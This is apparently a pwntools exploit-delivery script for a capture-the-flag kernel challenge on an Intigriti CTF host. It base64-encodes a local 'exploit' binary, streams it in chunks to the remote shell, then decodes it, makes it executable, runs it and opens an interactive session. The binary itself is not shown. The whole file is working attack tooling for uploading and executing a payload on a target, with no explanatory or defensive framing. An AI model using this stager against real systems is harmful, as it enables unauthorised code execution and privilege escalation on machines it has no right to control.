from pwn import *

r = remote("babykernel.ctf.intigriti.io", 1343);
r.sendlineafter(b"$", b'echo "start" >&2; while read line; do if [ "$line" = "end" ]; then break; fi; echo -n $line; done > tmp')

print("after send line...")
payload = b64e(read("exploit"))
#r.recvuntil(b"start\r\n");
print("after recvutil...")
sleep(0.5)
print("after sleep...")
to_send = payload.encode()
while to_send:
    r.sendline(to_send[:1000])
    to_send = to_send[1000:]
print("after encoding...")
r.send(b"\nend\n")
print("after send....")
r.sendlineafter(b"$", b"base64 -d tmp > exploit; chmod +x exploit")
r.sendlineafter(b"$", b"./exploit")
r.interactive()
